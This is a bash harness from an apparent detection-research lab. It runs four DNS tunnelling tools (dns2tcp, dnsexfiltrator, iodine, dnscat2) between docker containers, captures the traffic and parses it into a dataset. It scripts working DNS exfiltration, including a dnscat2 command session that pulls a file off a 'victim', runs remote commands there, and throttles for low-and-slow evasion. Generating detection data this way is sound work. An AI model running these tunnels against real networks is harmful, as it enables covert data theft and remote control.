#!/usr/bin/env bash
# One entry point for every tunnel tool in the lab (Trello card #8 asks for the same
# `run_tool.sh <tool> --size --rate` interface as the iodine/dnscat2 containers, so a
# Phase 2 capture script can loop over all four tools without special cases).
#
#   testbed/run_tool.sh --tool dns2tcp       --size 16384 --rate 2048
#   testbed/run_tool.sh --tool dnsexfiltrator --size 4096 --rate 5
#   testbed/run_tool.sh --tool dnsexfiltrator --size 4096 --rate 5 --base32 --capture
#   testbed/run_tool.sh --tool iodine         --size 65536 --rate 2048 --capture
#   testbed/run_tool.sh --tool dnscat2        --size 4096 --rate 2 --capture
#   testbed/run_tool.sh --tool dnscat2        --size 2048 --delay 5000 --qtype TXT --capture
#
# --size is payload bytes, --rate is the throttling knob the card wants: queries/second
# for dnsexfiltrator and dnscat2, bytes/second for dns2tcp and iodine, whose chunking is
# internal to the tool.
#
# --delay (iodine, dnscat2) is the tool's own delay between queries in milliseconds, the
# value the contract's `throttle` column records: dnscat2 `--delay <ms> --steady`, iodine
# `-I` (whole seconds, so it is rounded up). Use it for low-and-slow runs (--delay 5000
# is one dnscat2 query every 5 s). dnscat2 `--rate N` is shorthand for --delay 1000/N.
# --qtype (iodine, dnscat2) forces the DNS record type, e.g. TXT, CNAME, MX, NULL.
# --encoding (iodine) forces the downstream encoding: Base32, Base64, Base64u, Base128, Raw.
# --minutes on iodine/dnscat2 keeps the tunnel and the capture open until that many
# minutes have passed since the transfer started.
#
# --capture writes <out>/<tool>_<utc>.pcap. dns2tcp and dnsexfiltrator capture inside the
# tool's server container, because their clients resolve the tool server directly.
# iodine and dnscat2 go through the resolver, so they capture on the client container,
# where the query's source address is the compromised host.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(dirname "$SCRIPT_DIR")"
COMPOSE=(docker compose -f "$SCRIPT_DIR/tools/docker-compose.yml")
OUT="$SCRIPT_DIR/out"
TOOL=""
SIZE=0
RATE=""
MINUTES=""
CAPTURE=0
EXFIL_PASSWORD="${EXFIL_PASSWORD:-leakmate-lab}"
EXFIL_DOMAIN="${EXFIL_DOMAIN:-exfil.tunnel.test}"
DNS2TCP_DOMAIN="${DNS2TCP_DOMAIN:-dns2tcp.tunnel.test}"
DNS2TCP_KEY="${DNS2TCP_KEY:-leakmate-lab}"
DNS2TCP_LOCAL_PORT=8080
BASE32=0
DELAY=""
QTYPE=""
ENCODING=""
THROTTLE=0
IODINE_GATEWAY=10.0.0.1
RUN_TIMEOUT="${RUN_TIMEOUT:-1800}" # seconds to wait for a dnscat2 download to finish

usage() {
  sed -n '2,31p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'
  exit "${1:-0}"
}

[[ $# -eq 0 ]] && usage 2
while [[ $# -gt 0 ]]; do
  case "$1" in
    --tool) TOOL="$2"; shift 2 ;;
    --size) SIZE="$2"; shift 2 ;;
    --rate) RATE="$2"; shift 2 ;;
    --minutes) MINUTES="$2"; shift 2 ;;
    --delay) DELAY="$2"; shift 2 ;;
    --qtype) QTYPE="$2"; shift 2 ;;
    --encoding) ENCODING="$2"; shift 2 ;;
    --base32) BASE32=1; shift ;;
    --capture) CAPTURE=1; shift ;;
    --out) OUT="$2"; shift 2 ;;
    --help | -h) usage 0 ;;
    *) echo "unknown argument: $1" >&2; usage 2 ;;
  esac
done

case "$TOOL" in
  dns2tcp | dnsexfiltrator | iodine | dnscat2) ;;
  *) echo "--tool must be dns2tcp, dnsexfiltrator, iodine or dnscat2" >&2; exit 2 ;;
esac
[[ "$SIZE" =~ ^[0-9]+$ ]] && ((SIZE > 0)) || { echo "--size must be a positive byte count" >&2; exit 2; }
[[ -z "$RATE" || "$RATE" =~ ^[0-9]+$ ]] || { echo "--rate must be an integer" >&2; exit 2; }
[[ -z "$DELAY" || "$DELAY" =~ ^[0-9]+$ ]] || { echo "--delay must be an integer (milliseconds)" >&2; exit 2; }

[[ -z "$MINUTES" || "$MINUTES" =~ ^[0-9]+$ ]] || { echo "--minutes must be an integer" >&2; exit 2; }

# iodine and dnscat2 take their throttle and record type when the client starts, so the
# values are handed to compose as environment; `up` below recreates the client when they
# change. They are always exported (empty = tool default) so a run never inherits the
# previous run's settings from a container that is still up.
case "$TOOL" in
  iodine)
    export IODINE_INTERVAL=4 IODINE_TYPE="$QTYPE" IODINE_ENCODING="$ENCODING"
    if [[ -n "$DELAY" ]]; then
      IODINE_INTERVAL="$(((DELAY + 999) / 1000))"
      ((IODINE_INTERVAL >= 1)) || IODINE_INTERVAL=1
      THROTTLE="$DELAY"
    fi
    ;;
  dnscat2)
    [[ -z "$ENCODING" ]] || { echo "--encoding is iodine only; dnscat2 takes --qtype" >&2; exit 2; }
    [[ -z "$DELAY" || -z "$RATE" ]] || { echo "dnscat2: give --rate (queries/s) or --delay (ms), not both" >&2; exit 2; }
    if [[ -n "$RATE" ]]; then
      ((RATE >= 1 && RATE <= 20)) || { echo "dnscat2 --rate is 1-20 queries/s; use --delay for slower" >&2; exit 2; }
      DELAY="$((1000 / RATE))"
    fi
    export DNSCAT_DELAY=1000 DNSCAT_STEADY=0 DNSCAT_TYPE="$QTYPE"
    if [[ -n "$DELAY" ]]; then
      ((DELAY >= 50)) || { echo "--delay for dnscat2 must be at least 50 ms" >&2; exit 2; }
      DNSCAT_DELAY="$DELAY" DNSCAT_STEADY=1 THROTTLE="$DELAY"
    fi
    ;;
  *)
    [[ -z "$DELAY$QTYPE$ENCODING" ]] || { echo "--delay, --qtype and --encoding only apply to iodine and dnscat2" >&2; exit 2; }
    ;;
esac

# Keep the tunnel (and the capture) open until --minutes have passed since $1.
hold_until_minutes() {
  [[ -n "$MINUTES" ]] || return 0
  local left="$((MINUTES * 60 - ($(date +%s) - $1)))"
  ((left > 0)) || return 0
  echo "holding the $TOOL tunnel open for another ${left}s (--minutes $MINUTES)"
  sleep "$left"
}

mkdir -p "$OUT/$TOOL"
PROFILE="$TOOL"
"${COMPOSE[@]}" --profile "$PROFILE" up -d --build --wait >/dev/null

start_capture() {
  local container="$1"
  docker exec -d "$container" sh -c "rm -f /tmp/cap.pcap; tcpdump -qi eth0 -w /tmp/cap.pcap udp >/dev/null 2>&1"
  sleep 1 # tcpdump needs a moment to attach; a fast transfer would otherwise finish unseen
  echo "capturing udp on $container"
}

stop_capture() {
  local container="$1" file="$2"
  sleep 2 # let the last packets reach tcpdump before it is stopped
  docker exec "$container" sh -c 'pkill tcpdump' 2>/dev/null || true
  sleep 1
  docker cp "$container:/tmp/cap.pcap" "$file"
  echo "capture -> $file ($(wc -c <"$file") bytes)"
}

PCAP=""
if [[ "$CAPTURE" -eq 1 ]]; then
  PCAP="$OUT/${TOOL}_$(date -u +%Y%m%dT%H%M%SZ).pcap"
fi

case "$TOOL" in
  dnsexfiltrator)
    # --rate is queries/second, the unit the card names. The file is generated on the
    # client container so the source host label matches a real compromised host.
    [[ -n "$RATE" ]] || RATE=5
    docker exec dnsexfiltrator-cli python3 -c "
import os, pathlib
pathlib.Path('/out/payload.bin').write_bytes(os.urandom($SIZE))
print('payload', $SIZE, 'bytes')
"
    [[ "$CAPTURE" -eq 1 ]] && start_capture dnsexfiltrator-ns "$PCAP"
    docker exec dnsexfiltrator-cli python3 client.py /out/payload.bin \
      "$EXFIL_DOMAIN" "$EXFIL_PASSWORD" --resolver 172.28.0.41 --rate "$RATE" $([[ "$BASE32" -eq 1 ]] && echo --base32)
    sleep 1
    [[ "$CAPTURE" -eq 1 ]] && stop_capture dnsexfiltrator-ns "$PCAP"
    # The receiver writes a zip; prove the round trip rather than trusting exit codes.
    docker exec dnsexfiltrator-ns python3 - <<'PY'
import pathlib, sys, zipfile
p = pathlib.Path("/out/payload.zip")
if not p.exists():
    sys.exit("FAIL receiver never wrote /out/payload.zip")
with zipfile.ZipFile(p) as zf:
    data = zf.read(zf.namelist()[0])
print(f"PASS reassembled {len(data)} bytes from {p}")
PY
    ;;

  dns2tcp)
    # The tool chunks TCP itself, so --rate is applied as a bandwidth cap on the transfer.
    [[ -n "$RATE" ]] || RATE=2048
    docker exec dns2tcpd sh -c "head -c $SIZE /dev/urandom > /out/blob.bin && ls -l /out/blob.bin"
    [[ "$CAPTURE" -eq 1 ]] && start_capture dns2tcpd "$PCAP"
    # One tunnel session per run: dns2tcpc is a long-lived listener, so start it, transfer
    # through its local port, then stop it. `--minutes` keeps a session open for manual
    # interactive use (scp/ssh through the tunnel) instead of scripting it.
    docker exec -d dns2tcp-client sh -c "dns2tcpc -z $DNS2TCP_DOMAIN -r http -k $DNS2TCP_KEY -l $DNS2TCP_LOCAL_PORT 172.28.0.42 > /tmp/tunnel.log 2>&1"
    for _ in $(seq 1 30); do
      docker exec dns2tcp-client sh -c "grep -q 'Listening on port' /tmp/tunnel.log" 2>/dev/null && break
      sleep 1
    done
    if [[ -n "$MINUTES" ]]; then
      echo "tunnel open on dns2tcp-client:127.0.0.1:$DNS2TCP_LOCAL_PORT for ${MINUTES}m (Ctrl-C to stop)"
      sleep "$((MINUTES * 60))"
    else
      # curl --limit-rate has a 1k floor and the card's --rate is in bytes/second, so the
      # cap is a pacer script baked into the image (exact at a few hundred B/s).
      docker exec dns2tcp-client sh -c "
python3 /opt/dns2tcp/pull.py ${RATE} $DNS2TCP_LOCAL_PORT $SIZE /tmp/got.bin
got=\$(wc -c < /tmp/got.bin)
[ \"\$got\" = \"$SIZE\" ] || { echo \"FAIL \$got of $SIZE bytes\" >&2; exit 1; }
echo \"PASS \$got bytes through the DNS tunnel (md5 \$(md5sum /tmp/got.bin | cut -d' ' -f1))\"
"
    fi
    docker exec dns2tcp-client sh -c 'pkill dns2tcpc' 2>/dev/null || true
    [[ "$CAPTURE" -eq 1 ]] && stop_capture dns2tcpd "$PCAP"
    ;;

  iodine)
    # iodine is an IP tunnel: once the client has dialled in through the resolver, the
    # payload is plain TCP to the server's tunnel address, paced by pv when --rate is set.
    [[ -n "$RATE" ]] || RATE=0
    for _ in $(seq 1 60); do
      docker exec iodine-client ping -c1 -W1 "$IODINE_GATEWAY" >/dev/null 2>&1 && break
      sleep 1
    done
    docker exec iodine-client ping -c1 -W2 "$IODINE_GATEWAY" >/dev/null 2>&1 \
      || { echo "FAIL iodine tunnel never came up (docker logs iodine-client)" >&2; exit 1; }
    docker logs iodine-client 2>&1 | grep -E 'dialing|Switching upstream|downstream codec' | tail -3 || true
    [[ "$CAPTURE" -eq 1 ]] && start_capture iodine-client "$PCAP"
    T0="$(date +%s)"
    # The server counts what arrives, so the PASS line is a byte count, not an exit code.
    docker exec iodine-server sh -c 'pkill -x nc 2>/dev/null; rm -f /tmp/got.count'
    docker exec -d iodine-server sh -c 'nc -l 9000 | wc -c > /tmp/got.count'
    sleep 1
    PACE=""
    if ((RATE > 0)); then PACE="pv -qL $RATE |"; fi
    docker exec iodine-client sh -c "head -c $SIZE /dev/urandom | $PACE nc -N $IODINE_GATEWAY 9000"
    got=""
    for _ in $(seq 1 15); do
      got="$(docker exec iodine-server sh -c 'cat /tmp/got.count 2>/dev/null' | tr -d '[:space:]')"
      [[ -n "$got" ]] && break
      sleep 1
    done
    [[ "$got" == "$SIZE" ]] || { echo "FAIL ${got:-0} of $SIZE bytes" >&2; exit 1; }
    echo "PASS $got bytes through the iodine tunnel in $(($(date +%s) - T0))s"
    hold_until_minutes "$T0"
    [[ "$CAPTURE" -eq 1 ]] && stop_capture iodine-client "$PCAP"
    ;;

  dnscat2)
    # A scripted operator session, the way dnscat2 is really used: the dnscat2-client
    # container beacons in as a command session, and this script plays the attacker on the
    # server console (a FIFO, see tools/dnscat2/entrypoint.sh): a ping, the file download
    # that carries --size bytes off the victim, then two remote commands.
    verified() { docker logs dnscat2-server 2>&1 | grep -a -c 'Security: ENCRYPTED AND VERIFIED' || true; }
    # Select the beacon's window and send the command in one write: the console falls back
    # to the main window whenever another session ends, so the two must not be separated.
    c2() { docker exec dnscat2-server sh -c 'printf "window -i %s\n%s\n" "$1" "$2" > /tmp/console' _ "$SID" "$1"; }

    # A fresh beacon per run, so the session to drive is simply the newest one. Count the
    # sessions only once the restart has returned: the old client can still connect while
    # it is being stopped, and its session must not be mistaken for the new one.
    docker restart -t 1 dnscat2-client >/dev/null
    before="$(verified)"
    for _ in $(seq 1 120); do
      (("$(verified)" > before)) && break
      sleep 1
    done
    (("$(verified)" > before)) \
      || { echo "FAIL dnscat2 beacon never established (docker logs dnscat2-server)" >&2; exit 1; }
    SID="$(docker logs dnscat2-server 2>&1 | grep -a -o 'Session [0-9]* Security: ENCRYPTED AND VERIFIED' | tail -1 | cut -d' ' -f2)"
    docker logs dnscat2-client 2>&1 | grep 'beaconing' | tail -1 || true
    echo "dnscat2 command session $SID is up"

    [[ "$CAPTURE" -eq 1 ]] && start_capture dnscat2-client "$PCAP"
    T0="$(date +%s)"
    docker exec dnscat2-client sh -c "head -c $SIZE /dev/urandom > /tmp/payload.bin"
    want="$(docker exec dnscat2-client md5sum /tmp/payload.bin | cut -d' ' -f1)"
    docker exec dnscat2-server rm -f /tmp/loot.bin
    c2 "ping"
    c2 "download /tmp/payload.bin /tmp/loot.bin"
    got=""
    while (($(date +%s) - T0 < RUN_TIMEOUT)); do
      # `|| true`: until the download lands the file is missing, and under pipefail
      # that failure would end the script here.
      got="$(docker exec dnscat2-server sh -c 'md5sum /tmp/loot.bin 2>/dev/null' | cut -d' ' -f1 || true)"
      [[ "$got" == "$want" ]] && break
      sleep 2
    done
    [[ "$got" == "$want" ]] \
      || { echo "FAIL download did not finish within ${RUN_TIMEOUT}s (docker logs dnscat2-server)" >&2; exit 1; }
    echo "PASS $SIZE bytes downloaded from the victim in $(($(date +%s) - T0))s (md5 $want)"

    # Remote commands: each one opens its own short session from the victim, which is
    # what makes the traffic look like an operator at work rather than one bulk transfer.
    before="$(verified)"
    c2 "exec id"
    sleep 2
    c2 "exec hostname" # no flags: the console parses a leading dash as its own option
    for _ in $(seq 1 $((60 + DNSCAT_DELAY / 20))); do
      (("$(verified)" >= before + 2)) && break
      sleep 1
    done
    ran="$(("$(verified)" - before))"
    if ((ran >= 2)); then
      echo "PASS 2 remote commands ran on the victim (exec id, exec hostname)"
    else
      echo "WARN only $ran of 2 remote commands opened a session in time" >&2
    fi
    hold_until_minutes "$T0"
    [[ "$CAPTURE" -eq 1 ]] && stop_capture dnscat2-client "$PCAP"
    ;;
esac

if [[ "$CAPTURE" -eq 1 && -n "$PCAP" ]]; then
  # One command closes the card's loop: capture, then prove it parses into the contract
  # table. dpkt lives in the M2 requirements, so degrade to printing the command if absent.
  ROWS="$OUT/${TOOL}.ndjson"
  PARSE_ARGS=(--tool "$TOOL")
  case "$TOOL" in iodine | dnscat2) PARSE_ARGS+=(--throttle "$THROTTLE") ;; esac
  if python3 -c "import dpkt" 2>/dev/null; then
    python3 "$REPO_ROOT/scripts/parse_capture.py" "$PCAP" --out "$ROWS" "${PARSE_ARGS[@]}" \
      || { echo "parse_capture failed on $PCAP" >&2; exit 1; }
    echo "parsed $(wc -l < "$ROWS") rows -> $ROWS"
  else
    echo "next: python3 scripts/parse_capture.py $PCAP --out /tmp/${TOOL}.ndjson ${PARSE_ARGS[*]}"
  fi
fi
